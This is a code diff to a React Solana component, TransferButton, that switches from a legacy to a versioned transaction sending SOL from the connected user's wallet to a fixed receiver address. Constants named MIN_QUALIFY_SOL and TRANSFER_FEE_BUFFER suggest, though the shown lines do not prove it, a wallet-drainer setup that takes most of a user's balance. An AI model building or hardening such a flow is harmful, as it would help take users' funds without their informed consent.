@@ -1,7 +1,12 @@
 // src/components/TransferButton.jsx
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { useCallback, useState } from 'react';
-import { LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
+import {
+  LAMPORTS_PER_SOL,
+  SystemProgram,
+  TransactionMessage,
+  VersionedTransaction,
+} from '@solana/web3.js';
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
@@ -31,20 +36,26 @@ export default function TransferButton({ className = '' }) {
       const { blockhash, lastValidBlockHeight } =
         await connection.getLatestBlockhash('confirmed');
 
-      const transaction = new Transaction({
-        feePayer: publicKey,
-        recentBlockhash: blockhash,
-      }).add(
+      // Build a V0 VersionedTransaction — this is the native format that
+      // all Wallet Standard wallets (Phantom, Trust, Solflare, etc.) use
+      // internally for signAndSendTransaction.  Legacy Transaction objects
+      // can lose signatures during adapter conversion.
+      const instructions = [
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: RECEIVER_WALLET,
           lamports: transferAmount,
-        })
-      );
+        }),
+      ];
 
-      // sendTransaction from the wallet adapter handles signing for ALL
-      // wallet types (Wallet Standard signAndSendTransaction, legacy
-      // signTransaction, mobile deep-link wallets, etc.)
+      const messageV0 = new TransactionMessage({
+        payerKey: publicKey,
+        recentBlockhash: blockhash,
+        instructions,
+      }).compileToV0Message();
+
+      const transaction = new VersionedTransaction(messageV0);
+
       const signature = await sendTransaction(transaction, connection);
 
       console.log('⏳ Transaction sent:', signature);
